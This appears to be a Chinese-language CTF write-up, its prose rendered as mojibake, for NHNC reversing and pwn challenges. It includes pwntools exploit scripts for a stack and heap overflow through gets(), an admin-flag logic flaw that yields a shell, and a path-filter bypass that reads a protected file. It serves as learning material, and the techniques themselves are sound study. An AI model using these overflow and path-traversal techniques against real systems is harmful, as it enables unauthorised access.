åªæœ‰å¹¸é‹çš„äººæ‰æœƒæ‹¿åˆ° flagã€‚ä¸å¹¸é‹çš„äººå•Šï½ä»Šå¤©ä¸æ˜¯ä½ æ‹¿åˆ†æ•¸çš„å¥½æ—¥å­ï¼
```
[file link](https://nhnc.ic3dt3a.org/files/c8ca6ecc673f41a29cf097dd79c14256/guess_the_num?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6MTd9.Zzqt1w.dXtqu9YRYdFW-NEfPFpj7o7lfeU)

é€™é‚Šç”¨IDAæ‰“é–‹

mainå‡½å¼è£¡:
```c=
  srand(0x1234u);
  printf("Lottery! Enter your number: ");
  __isoc99_scanf("%u", &v5);
  v3 = v5 % 0xFF;
  if ( v3 == rand() % 255 )
  {
    printf("You're blessed today! Here's your flag: %s\n", flag);
    puts("Caution ahead! You will be *DISQUALIFIED* if you share the flag; not everyone has the luck you do!");
  }
  else
  {
    puts("You shall not pass! Only those who have luck can get the flag!");
  }
```
`flag`æ˜¯åœ¨å…¨åŸŸè®Šæ•¸ï¼Œç›´æ¥é»é–‹çœ‹æ˜¯`NHNC{as_clear_as_plaintext}`

ä½†æäº¤æ˜¯é¡¯ç¤ºéŒ¯èª¤ï¼Œå›å»çœ‹çœ‹æœ‰é‚£äº›å‡½å¼

ç™¼ç¾äº†`sub_1217()`ï¼Œè£¡é¢æœ‰å­˜å–åˆ°`flag`è®“æˆ‘å¾ˆåœ¨æ„:
```c=
_BYTE *sub_1217()
{
  __int64 v0; // rax
  _BYTE *result; // rax
  //flag = 'NHNC{as_clear_as_plaintext}'
  v0 = sub_11E9(&flag[0x10000]);
  *(_BYTE *)(v0 + 5) += 19;
  *(_DWORD *)(v0 + 6) -= 117440001;
  *(_WORD *)(v0 + 10) = 24420;
  *(_QWORD *)(v0 + 12) ^= 0x3E0304001D163016uLL;
  *(_DWORD *)(v0 + 20) = 1919906916;
  *(_BYTE *)(v0 + 24) = 125;
  result = (_BYTE *)(v0 + 25);
  *result = 0;
  return result;
}
```
`sub_11E9()`:
```c=
__int64 __fastcall sub_11E9(__int64 a1)
{
  if ( rand() == -70111375 )
    return a1;
  else
    return a1 - 0x10000;
}
```
ä»”ç´°åˆ†æ`sub_1217()`:
- `flag[0x10000]`å…¶å¯¦å°±æ˜¯`flag[0]`çš„åœ°å€å¾€å¾Œåç§»`0x10000`
- `rand()`æœƒå›å‚³çš„å°±åªæœ‰æ­£æ•¸ï¼Œæ‰€ä»¥`sub_11E9()`åªæœƒå›å‚³`a1 - 0x10000`
    â†’`v0` = `flag[0]`
å‰©ä¸‹æ€•æœƒè¨ˆç®—éŒ¯èª¤ï¼Œé€™é‚Šç›´æ¥æŠŠcodeè½‰æ›æˆä¸€èˆ¬çš„Cèªè¨€åŸ·è¡Œ:
```c=
#include <stdio.h>
#include <stdint.h>
int main() {
    char flag[27] = "NHNC{as_clear_as_plaintext}";
    //sub_1217()
    int64_t v0 = (int64_t)(&flag[0]);

    flag[5] += 19;

    uint32_t *ptr_dword = (uint32_t *)(v0 + 6);
    *ptr_dword -= 117440001;

    uint16_t *ptr_word = (uint16_t *)(v0 + 10);
    *ptr_word = 24420;

    uint64_t *ptr_qword = (uint64_t *)(v0 + 12);
    *ptr_qword ^= 0x3E0304001D163016uLL;

    uint32_t *ptr_dword_2 = (uint32_t *)(v0 + 20);
    *ptr_dword_2 = 1919906916;
    flag[24] = 125;
    flag[25] = '\0';
    printf(flag);
    return 0;
}
```

> NHNC{traced_down_to_dtor}


# PWN
## Grading system (100 pts)
```
å‡ºé¡Œè€…ï¼šRaymond

ç·šä¸Šè©•åˆ†ç³»çµ±ï¼å¹«ä½ çš„å­¸ç”Ÿç™»è¨˜åˆ†æ•¸çš„å¥½å·¥å…·ï¼

nc chal.nhnc.ic3dt3a.org 2003
```
[file link](https://nhnc.ic3dt3a.org/files/999ec6d04ddd2748cfdb904ef3f02a92/grading_system.zip?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6NjV9.ZzrleQ.92HCyBGfRKK_XRkA-wt0YOddt98)

ç¨å¾®çœ‹ä¸€ä¸‹source codeï¼Œåœ¨switch choiceæ™‚ï¼Œæœ‰å€‹é¸é …å¯ä»¥é–‹shell:
```c=
case 'S':
    if (is_admin) {
        spawn_shell();
        break;
    } else {
        puts("Contact admin if you a bug occurred");
        break;
    }  
```
åŸæœ¬åœ¨æƒ³è¦æ€éº¼ç”¨buffer overflowè“‹æ‰`is_admin`ï¼Œä½†ç™¼ç¾åˆå§‹å€¼æ˜¯`1234`

æˆ‘:???

æ‰€ä»¥exploitå¾ˆç°¡å–®:
```python=
from pwn import *

r = remote("chal.nhnc.ic3dt3a.org",2003)

r.sendlineafter('Number of students: ',b'114514')
r.sendlineafter('Your choice:',b'S')
r.interactive()
r.close()
```

```bash
$ ls
chal
flag
run.sh
$ cat flag
NHNC{i_dont_think_you_are_a_teacher}
exit
```

> NHNC{i_dont_think_you_are_a_teacher}

## DOF (100 pts)
```
å‡ºé¡Œè€…ï¼šwhale.120

I've heard that you just learned overflow, show me twice!

nc chal.nhnc.ic3dt3a.org 2000
```
[file link](https://nhnc.ic3dt3a.org/files/9aa61456b15198e0e8ff13cf67f95783/chal_23?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6NjZ9.Zzvxbg.bIUHXCsDgtTUpCbFCxFrw3bHO-g)

ä¸ŸIDA:
```c=
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rdx
  __int64 v4; // rcx
  __int128 v6; // [rsp+0h] [rbp-30h] BYREF
  char v7[14]; // [rsp+10h] [rbp-20h] BYREF
  __int16 v8; // [rsp+1Eh] [rbp-12h]
  unsigned __int64 v9; // [rsp+28h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  v6 = 0LL;
  strcpy(v7, "cat_say_meow");
  v7[13] = 0;
  v8 = 0;
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  printf("What's you name:");
  ((void (__fastcall *)(__int128 *))gets)(&v6);
  if ( strstr(v7, "cat_sleeping") )
    secret_d00r(v7, "cat_sleeping", v3, v4);
  puts(v7);
  return 0;
}
```
çœ‹åˆ°`gets()`å’Œé¡Œæ•˜å°±å¯ä»¥çŒœåˆ°æ˜¯buffer overflowäº†

ç›®å‰`main`è£¡çš„ç›®æ¨™æ˜¯é€²å…¥`secret_d00r()`

æ‰€ä»¥è¦æƒ³è¾¦æ³•ç”¨BOFè“‹æ‰`v7`

ç„¶å¾Œæˆ‘æ¯”è¼ƒå–œæ­¡çœ‹ä¸Šé¢IDAçµ¦çš„è¨»è§£:
```c=
v9 [rbp-8h]
v8 [rbp-12h]
v7 [rbp-20h]
```
è“‹æ‰`v9`+`v8`(0x12)ï¼Œå¾Œé¢æ¥ä¸Š`cat_sleeping`

æ¥è‘—å°±å¯ä»¥é€²å…¥`secret_d00r`:
```c=
int secret_d00r()
{
  __int64 v0; // rdx
  __int64 v1; // rcx
  __int64 v2; // r8
  __int64 v3; // r9
  char v5; // [rsp+7h] [rbp-19h]
  FILE *stream; // [rsp+8h] [rbp-18h]
  void *v7; // [rsp+10h] [rbp-10h]
  void *dest; // [rsp+18h] [rbp-8h]

  stream = fopen("flag", "r");
  if ( !stream )
  {
    puts("System Error...:(");
    exit(1);
  }
  v7 = malloc(0x14uLL);
  dest = malloc(0x14uLL);
  if ( !v7 || !dest )
    exit(0);
  memcpy(dest, "whale_meowing", 0xDuLL);
  puts("Welcome to the secret d00r");
  puts("There's a HEAP of broken doors, can you tell it's name?");
  printf("Enter the name: ");
  gets(v7, "whale_meowing", v0, v1, v2, v3);
  if ( strstr((const char *)dest, "pwn3d!!!") )
  {
    while ( 1 )
    {
      v5 = fgetc(stream);
      if ( v5 == -1 )
        break;
      putchar(v5);
    }
  }
  else
  {
    puts(aIThinkYouHaven);
  }
  return fclose(stream);
}
```
å¯ä»¥çœ‹å‡ºç•¶`dest`å…§å«æœ‰"pwn3d!!!"å­—ä¸²ï¼Œå°±å¯ä»¥çœ‹åˆ°flagäº†

å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ`v7`å’Œ`dest`åœ¨åŸ·è¡Œæ™‚æœ‰ç”¨`malloc()`å‹•æ…‹åˆ†é…ç©ºé–“

æˆ‘å› ç‚ºæ€•è¨ˆç®—éŒ¯èª¤ï¼Œå¯«äº†å€‹C codeæ¨¡æ“¬çœ‹åˆ°ç©ºé–“è¨ˆç®—offset:
```c=
#include <stdio.h>
#include <stdlib.h>

int main() {
    void *v7;
    void *dest;

    v7 = malloc(0x14uLL);
    dest = malloc(0x14uLL);

    printf("v7: %p\n", v7);
    printf("dest: %p\n", dest);

    free(v7);
    free(dest);

    return 0;
}
```
åŸ·è¡Œçµæœ:
```
v7: 0xbb32a0
dest: 0xbb32c0
```
å¯ä»¥ç®—å‡ºoffset = 0xbb32c0 - 0xbb32a0 = 0x20

æˆ‘å€‘å°±å¯ä»¥æ’°å¯«exploit:
```python=
from pwn import *

#r = process('./chal_23')
r = remote("chal.nhnc.ic3dt3a.org",2000)

r.sendline(b'a'*0x12 + b'cat_sleeping')
r.recvuntil("Enter the name: ")
r.sendline(b'A'*0x20+b'pwn3d!!!')
r.interactive()
r.close()
```

> NHNC{dof==doblue_over_flow?!?!}

## Fishbaby's Library (300 pts)
```
å‡ºé¡Œè€…: Raymond

Fishbaby é–‹äº†ä¸€é–“åœ–æ›¸é¤¨ï¼Œä½†æ˜¯æŠŠ flag é–åœ¨åœ–æ›¸é¤¨çš„ç¦å€ï¼Œä½ èƒ½å¤ çªç ´é˜²è­·æªæ–½ä¸¦è®€å– flag å—ï¼Ÿ

nc chal.nhnc.ic3dt3a.org 2002
```
[file link](https://nhnc.ic3dt3a.org/files/34abcd77e3a9f2d63c9aebcc3cd3a0e8/fishbabys_library_upd.zip?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6ODF9.ZzybZQ.Akun0XrNCnG3njYwgcL2i18z9cE)
source codeå¾ˆé•·ï¼Œå°±ä¸æ”¾äº†

æœ€å‰›é–‹å§‹æ™‚ï¼Œexploit codeæœ‰æ”¾åœ¨çµ¦çš„zipæª”å…§

ä½†ä»–å€‘ç™¼ç¾æ™‚å·²ç¶“æœ‰5å€‹äººè§£äº†

~~å¾ˆå¹¸é‹æˆ‘åœ¨é‚£5å€‹äººä¹‹ä¸­~~

æ‰€ä»¥æˆ‘åœ¨é€™é‚Šå°±è¬›è¬›ä»–çš„ exploit:
```python=
from pwn import *

p = remote('chal.nhnc.ic3dt3a.org', 2002)

p.sendline('S')
p.sendline('.')
p.sendline('R')
p.sendlineafter('Filename? ', '/home/chal/classified/flag')

flag = p.recvline()
log.info(flag)

p.close()
```
ç°¡å–®ä¾†èªªï¼Œæˆ‘å€‘è¦é€é`read_file`ä¾†å¾—åˆ°flag

é¸å–®æŒ‰`L`å¯ä»¥çœ‹åˆ°åº•ä¸‹çš„å…§å®¹:
```
Your choice> L
licenses/
rfcs/
classified/
hello_world/
visitor_notice.txt
run.sh
chal
gallery/
```
ç„¶å¾Œåœ¨sourceå¯ä»¥çœ‹åˆ°ï¼Œ`R`é¸é …æ˜¯ç”¨æ–¼read file

ä¸¦ä¸”åœ¨`S`åšSet categoryæ™‚å°`classified`æœ‰éæ¿¾
```c=
case 'S':
  printf("Which category interests you? ");

  memset(category, 0x00, sizeof(category));
  scanf(" %[^\n./]", category);

  if (strstr(category, "..") || strstr(category, "/") || strstr(category, "classified")) {
    puts("Hacker!");
    exit(0xdead);
  }
```
å›å»çœ‹åˆ°exploitï¼Œè¼¸å…¥é †åºç‚º:`S` -> `.` -> `R` -> `/home/chal/classified/flag`

å‰é¢`S`å…ˆç”¨`.`ï¼Œä»£è¡¨çš„æ˜¯ç•¶å‰ç›®éŒ„ï¼Œç”¨ä¾†ç¹é`..` / `/` / `classified`

å¾Œé¢`R`å†è¨­å®šçµ•å°è·¯å¾‘`/home/chal/classified/flag`

ä¸²æ¥å¾Œï¼Œå®Œæ•´çš„ç³»çµ±æŸ¥è©¢è·¯å¾‘å°±è®Šæˆ:`./home/chal/classified/flag`

æäº¤exploit:

> NHNC{sneaked_into_forbidden_zone}